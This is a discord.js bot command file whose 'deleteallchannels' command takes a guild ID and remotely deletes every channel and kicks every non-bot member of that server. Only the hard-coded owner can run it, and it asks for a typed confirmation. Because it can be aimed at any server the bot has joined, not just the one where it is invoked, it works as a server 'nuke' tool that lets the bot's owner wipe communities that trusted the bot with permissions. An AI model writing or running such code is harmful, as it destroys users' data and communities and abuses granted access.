import { PermissionsBitField, EmbedBuilder } from 'discord.js';

export default {
    name: 'deleteallchannels',
    description: 'Delete all channels and kick all members from a specified guild.',
    async execute(message, args) {
        // Replace this with your Discord user ID
        const ownerId = '1271600306383355979';

        // Check if the message author is the owner
        if (message.author.id !== ownerId) {
            const noPermsEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('Unauthorized')
                .setDescription('Only the bot owner can run this command.');
            return message.reply({ embeds: [noPermsEmbed] });
        }

        // Check if a guild ID is provided
        if (!args[0]) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FFA500')
                .setTitle('Invalid Usage')
                .setDescription('Usage: `!deleteallchannels <guildID>`\nYou must provide a guild ID to proceed.');
            return message.reply({ embeds: [usageEmbed] });
        }

        const guildId = args[0];
        const guild = message.client.guilds.cache.get(guildId);

        // Check if the bot is in the guild
        if (!guild) {
            const notFoundEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('Guild Not Found')
                .setDescription(`I am not in a guild with ID: \`${guildId}\`.`);
            return message.reply({ embeds: [notFoundEmbed] });
        }

        // Confirmation message
        const confirmEmbed = new EmbedBuilder()
            .setColor('#FFA500')
            .setTitle('Are you sure?')
            .setDescription(
                `This will **delete all channels** and **kick all members** (except the bot) from the guild \`${guild.name}\`.\n` +
                'Reply with `confirm` to proceed or `cancel` to abort.'
            );

        message.channel.send({ embeds: [confirmEmbed] });

        // Await user confirmation
        const filter = (response) => response.author.id === message.author.id;
        const collector = message.channel.createMessageCollector({ filter, time: 15000 });

        collector.on('collect', async (response) => {
            const content = response.content.toLowerCase();
            if (content === 'confirm') {
                collector.stop();

                const processingEmbed = new EmbedBuilder()
                    .setColor('#FFFF00')
                    .setTitle('Processing...')
                    .setDescription('I am now deleting all channels and kicking all members from the guild.');

                message.channel.send({ embeds: [processingEmbed] });

                // Delete all channels
                try {
                    const channels = guild.channels.cache;
                    for (const channel of channels.values()) {
                        await channel.delete();
                    }
                } catch (error) {
                    const channelErrorEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setTitle('Channel Deletion Error')
                        .setDescription('An error occurred while deleting the channels. Ensure I have the necessary permissions.');
                    message.channel.send({ embeds: [channelErrorEmbed] });
                }

                // Kick all members
                try {
                    const members = guild.members.cache.filter((member) => !member.user.bot);
                    for (const member of members.values()) {
                        await member.kick('Mass kick triggered by command.');
                    }

                    const successEmbed = new EmbedBuilder()
                        .setColor('#00FF00')
                        .setTitle('Guild Cleared')
                        .setDescription('All channels have been deleted and all members have been kicked from the guild.');
                    message.author.send({ embeds: [successEmbed] }).catch(() => {
                        // Ignore if the bot cannot DM the user
                    });
                } catch (error) {
                    const memberErrorEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setTitle('Member Kick Error')
                        .setDescription('An error occurred while kicking members. Ensure I have the necessary permissions.');
                    message.channel.send({ embeds: [memberErrorEmbed] });
                }
            } else if (content === 'cancel') {
                collector.stop();
                const cancelEmbed = new EmbedBuilder()
                    .setColor('#00FF00')
                    .setTitle('Action Cancelled')
                    .setDescription('No channels were deleted and no members were kicked.');
                return message.channel.send({ embeds: [cancelEmbed] });
            }
        });

        collector.on('end', (collected) => {
            if (collected.size === 0) {
                const timeoutEmbed = new EmbedBuilder()
                    .setColor('#FFA500')
                    .setTitle('Timeout')
                    .setDescription('No response received. Command has been cancelled.');
                message.channel.send({ embeds: [timeoutEmbed] });
            }
        });
    },
};
